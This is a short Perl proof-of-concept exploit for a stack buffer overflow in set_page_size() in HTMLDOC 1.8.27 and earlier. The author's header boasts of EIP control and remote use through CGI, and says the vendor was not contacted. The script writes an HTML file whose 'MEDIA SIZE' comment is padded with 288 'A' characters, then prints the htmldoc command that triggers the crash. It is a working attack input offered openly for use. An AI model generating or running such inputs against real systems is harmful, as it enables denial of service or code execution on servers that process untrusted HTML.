#!/usr/bin/perl
#
# [~] HTMLDOC <= 1.8.27 Bufferoverflow POC
# [^] www.htmldoc.org
# [*] Autore: ANTHRAX666 <anthrax.the.666@gmail.com>
# [+] StackBased OverFlow In set_page_size()
# [/] EIPregister Is Raped By Us So Not Just Krash
# [!] Is Both Local Also Remote (As CGI Skript)
# [-] Sevrity: HIGH
# [?] Vendor Kontakt: NOPE
#
#                        ,-.        _.---._
#                       |  `\.__.-''       `.
#                        \  _        _  ,.   \
#  ,+++=._________________)_||______|_|_||    |
# (_.ooo.===================||======|=|=||    |
#    ~~'                 |  ~'      `~' o o  /
#                         \   /~`\     o o  /
#                          `~'    `-.____.-'
# HEAVY METAL RULEZ WORLD VERY LOT!!
#

unlink("anthrax666.html");
open(FILE,">>anthrax666.html");
print FILE "<!-- MEDIA SIZE 1x1";
print FILE "A"x288;
print FILE " -->\n";
close(FILE);
print "Run And Watch Burn:  htmldoc -f ant.pdf anthrax666.html\n";

